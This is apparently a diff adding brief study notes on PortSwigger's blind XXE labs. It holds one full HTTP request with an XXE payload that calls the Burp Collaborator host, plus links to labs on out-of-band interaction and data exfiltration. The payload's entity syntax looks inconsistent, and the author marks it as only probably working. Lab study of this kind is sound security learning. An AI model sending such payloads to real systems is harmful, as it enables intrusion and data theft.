@@ -1,0 +1,38 @@
+Only with BurpCollaborator
+
+
+[1] - Lab: Blind XXE with out-of-band interaction via XML parameter entities
+https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction.
+
+Probable the following request works:
+
+		POST /product/stock HTTP/1.1
+		Host: XYZ.web-security-academy.net
+		Cookie: session=aJyJRFzzS0h4lsPLrJdKu1DgtJyYebxg
+		Content-Length: 191
+		Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
+		Sec-Ch-Ua-Mobile: ?0
+		User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
+		Sec-Ch-Ua-Platform: "macOS"
+		Content-Type: application/xml
+		Accept: */*
+		Origin: https://XYZ.web-security-academy.net
+		Sec-Fetch-Site: same-origin
+		Sec-Fetch-Mode: cors
+		Sec-Fetch-Dest: empty
+		Referer: https://XYZ.web-security-academy.net/product?productId=2
+		Accept-Encoding: gzip, deflate
+		Accept-Language: en-US,en;q=0.9
+		Connection: close
+
+		<?xml version="1.0" encoding="UTF-8"?>
+		<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://burpcollaborator.net"> ]>
+		<stockCheck><productId>%xxe;</productId><storeId>1</storeId></stockCheck>
+
+
+[2] Lab: Blind XXE with out-of-band interaction via XML parameter entities
+https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities
+
+
+[3] Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
+https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration
